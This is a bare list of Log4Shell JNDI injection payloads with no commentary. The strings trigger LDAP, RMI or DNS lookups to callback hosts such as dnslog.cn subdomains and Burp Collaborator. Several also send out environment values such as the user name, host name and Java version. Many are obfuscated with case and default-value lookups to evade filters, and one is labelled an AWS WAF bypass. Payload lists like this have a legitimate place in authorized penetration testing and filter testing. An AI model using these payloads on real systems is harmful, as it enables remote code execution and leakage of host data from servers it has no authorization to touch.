```
${jndi:ldap://${env:user}.uedo81.dnslog.cn/exp}

${jndi:dns://${hostName}.uedo81.dnslog.cn/a}

${jndi:dns://${env:COMPUTERNAME}.uedo81.dnslog.cn/a}

${jndi:dns://${env:USERDOMAIN}.qnfw43.dnslog.cn/a}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://dslepf.dnslog.cn/tem}

${${lower:jndi}:${lower:rmi}://dslepf.dnslog.cn/tem}

${jndi:ldap://dslepf.dnslog.cn/exp}

${jndi:dns://aeutbj.example.com/ext}

${jndi:${lower:l}${lower:d}a${lower:p}://example.com/

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/ass}

${${::-j}ndi:rmi://127.0.0.1:1389/ass}

${jndi:rmi://a.b.c}

${${lower:jndi}:${lower:rmi}://q.w.e/poc}

${${lower:${lower:jndi}}:${lower:rmi}://a.s.d/poc}

${jndi:ldap://${env:JAVA_VERSION}.domain/a}

${jndi:ldap://${sys:java.version}.domain/a}

${jndi:ldap://${hostName}.domain/a}

${jndi:ldap://${sys:java.vendor}.domain/a}

${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a}

${j${k8s:k5:-ND}i${sd:k5:-:}ldap://mydogsbutt.com:1389/o} (AWS WAF bypass)
```
